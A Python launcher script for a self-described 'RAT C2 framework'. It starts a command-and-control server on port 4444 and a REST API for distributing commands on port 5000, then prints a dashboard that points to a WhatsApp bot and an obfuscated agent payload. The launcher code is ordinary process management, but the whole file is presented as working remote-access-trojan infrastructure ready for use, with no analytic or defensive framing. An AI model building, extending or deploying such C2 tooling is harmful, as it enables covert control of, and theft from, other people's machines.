#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════════
    RAT C2 FRAMEWORK - PRODUCTION LAUNCHER
    Starts all components and provides dashboard
═══════════════════════════════════════════════════════════════════════════════
"""

import os
import sys
import subprocess
import time
import signal
import threading
from pathlib import Path

class ProductionLauncher:
    def __init__(self):
        self.processes = {}
        self.running = True
        
    def banner(self):
        print(f"""
╔{'═'*78}╗
║ {'':78} ║
║ {'🚀 RAT C2 FRAMEWORK - PRODUCTION LAUNCH'.center(78)} ║
║ {'':78} ║
║ {'ULTIMATE RAT C2 SERVER - COMPETITION EDITION'.center(78)} ║
║ {'Professional Command & Control System'.center(78)} ║
║ {'':78} ║
╚{'═'*78}╝

        _   _          _                     ____   __  _____ 
       | | | |_  _____| | _____ _ __        |___ \ / /_|___ / 
       | |_| \ \/ / __| |/ / _ \ '__| ____    __) | '_ \ |_ \ 
       |  _  |>  < (__|   <  __/ |   |____|  / __/| (_) |__) |
       |_| |_/_/\_\___|_|\_\___|_|          |_____|\___/____/ 

═════════════════════════════════════════════════════════════════════════════════
        """)

    def print_status(self, service, status, message=""):
        symbols = {
            'starting': '⟳',
            'running': '●',
            'stopped': '○',
            'error': '✗'
        }
        colors = {
            'starting': '\033[93m',
            'running': '\033[92m',
            'stopped': '\033[90m',
            'error': '\033[91m'
        }
        reset = '\033[0m'
        
        sym = symbols.get(status, '?')
        color = colors.get(status, '')
        
        msg = f"  {color}{sym} {service:20} {status:12}{reset} {message}"
        print(msg)

    def start_service(self, name, command, port=None):
        """Start a service"""
        self.print_status(name, 'starting', f'on port {port}' if port else '')
        
        try:
            proc = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                preexec_fn=os.setsid if sys.platform != 'win32' else None
            )
            self.processes[name] = {
                'proc': proc,
                'port': port,
                'pid': proc.pid
            }
            time.sleep(1)
            
            if proc.poll() is None:
                self.print_status(name, 'running', f'PID {proc.pid}' + (f' on :{port}' if port else ''))
                return True
            else:
                _, stderr = proc.communicate(timeout=1)
                self.print_status(name, 'error', stderr[:60] if stderr else 'Unknown error')
                return False
        except Exception as e:
            self.print_status(name, 'error', str(e)[:60])
            return False

    def shutdown_handler(self, signum, frame):
        """Handle shutdown signal"""
        print("\n\n" + "="*80)
        print("🛑 SHUTTING DOWN ALL SERVICES...")
        print("="*80 + "\n")
        
        self.running = False
        for name, info in self.processes.items():
            try:
                proc = info['proc']
                if proc.poll() is None:
                    print(f"  Stopping {name}...", end='', flush=True)
                    if sys.platform != 'win32':
                        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                    else:
                        proc.terminate()
                    proc.wait(timeout=3)
                    print(" ✓")
            except:
                try:
                    proc.kill()
                except:
                    pass
        
        print("\n✓ All services stopped")
        sys.exit(0)

    def monitor_services(self):
        """Monitor service health"""
        while self.running:
            for name, info in self.processes.items():
                proc = info['proc']
                if proc.poll() is not None:
                    self.print_status(name, 'stopped', 'Process exited')
            time.sleep(5)

    def launch(self):
        """Launch all services"""
        self.banner()
        
        print("┌" + "─"*78 + "┐")
        print("│ STARTING SERVICES".ljust(79) + "│")
        print("└" + "─"*78 + "┘\n")
        
        # Services to start
        services = [
            {
                'name': 'C2 Server',
                'command': [sys.executable, 'rat_server_fixed.py'],
                'port': 4444
            },
            {
                'name': 'REST API',
                'command': [sys.executable, 'rest_api_server.py'],
                'port': 5000
            },
        ]
        
        started = 0
        for service in services:
            if self.start_service(service['name'], service['command'], service['port']):
                started += 1
        
        print("\n" + "="*80)
        print(f"✓ Started {started}/{len(services)} services")
        print("="*80 + "\n")
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.shutdown_handler)
        signal.signal(signal.SIGTERM, self.shutdown_handler)
        
        # Print dashboard
        print("┌" + "─"*78 + "┐")
        print("│ SERVICE DASHBOARD".ljust(79) + "│")
        print("├" + "─"*78 + "┤")
        print("│ Service          │ Status    │ Port  │ PID".ljust(79) + "│")
        print("├" + "─"*78 + "┤")
        
        for name, info in self.processes.items():
            proc = info['proc']
            port = info['port'] if info['port'] else '-'
            pid = info['pid']
            status = '✓ Running' if proc.poll() is None else '✗ Stopped'
            
            line = f"│ {name:16} │ {status:9} │ {str(port):>5} │ {pid:>6}".ljust(79) + "│"
            print(line)
        
        print("├" + "─"*78 + "┤")
        print("│ COMMAND INTERFACE".ljust(79) + "│")
        print("├" + "─"*78 + "┤")
        print("│ C2 Server:       http://0.0.0.0:4444     (Interactive shell)".ljust(79) + "│")
        print("│ REST API:        http://0.0.0.0:5000     (Command distribution)".ljust(79) + "│")
        print("│ WhatsApp Bot:    python startup.py bot  (In another terminal)".ljust(79) + "│")
        print("│ Obfuscated Agent: python dist/agent_payload_agent.py".ljust(79) + "│")
        print("├" + "─"*78 + "┤")
        print("│ Press CTRL+C to shutdown all services".ljust(79) + "│")
        print("└" + "─"*78 + "┘\n")
        
        # Monitor
        self.monitor_services()

def main():
    launcher = ProductionLauncher()
    try:
        launcher.launch()
    except KeyboardInterrupt:
        print("\n")
        launcher.shutdown_handler(None, None)

if __name__ == '__main__':
    main()
